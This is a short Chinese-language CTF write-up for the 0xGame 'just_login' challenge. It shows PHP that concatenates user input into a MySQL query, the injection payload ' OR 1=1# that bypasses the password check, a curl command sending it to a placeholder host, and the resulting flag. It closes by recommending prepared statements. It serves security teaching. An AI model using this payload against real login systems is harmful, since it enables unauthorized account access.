# week2just_login

## 题目简述

登录接口把 POST 参数直接拼接进 MySQL 查询，没有参数化、转义或输入校验。只要注入一个恒真条件并注释掉后续密码判断，使查询返回至少一行，就会进入成功分支并输出 flag。

```php
$sql = "select username from user where username='"
     . $username
     . "' and password='"
     . $password
     . "';";

$res = mysql_query($sql);
if (@mysql_num_rows($res) <= 0) {
    die("数据库里没你这号人,别想骗劳资.jpg");
}
echo 'Login Success!Here is your flag:', $flag;
```

## 解题过程

令用户名为：

```text
' OR 1=1#
```

密码可填写任意内容。拼接后的 SQL 等价于：

```sql
select username from user
where username='' OR 1=1#' and password='anything';
```

MySQL 中 `#` 会把本行剩余内容注释掉，实际条件变成 `username='' OR 1=1`，从而返回用户表中的记录。用 curl 发送表单时可以让工具负责 URL 编码：

```bash
curl -s -X POST 'http://<HOST>:<PORT>/login.php' \
  --data-urlencode "username=' OR 1=1#" \
  --data-urlencode 'password=anything'
```

仓库源码中的返回值为：

```text
0xGame{e5sy_sql_1njeCtion}
```

## 方法总结

- 核心技巧：闭合用户名字符串、加入恒真条件并注释后续密码子句。
- 识别信号：SQL 由字符串拼接构造，用户输入位于引号内部，成功条件仅检查结果行数。
- 复用要点：注释符要符合具体数据库语法，`--` 后通常需要空格；防御应使用预处理语句和绑定参数，而不是黑名单转义。
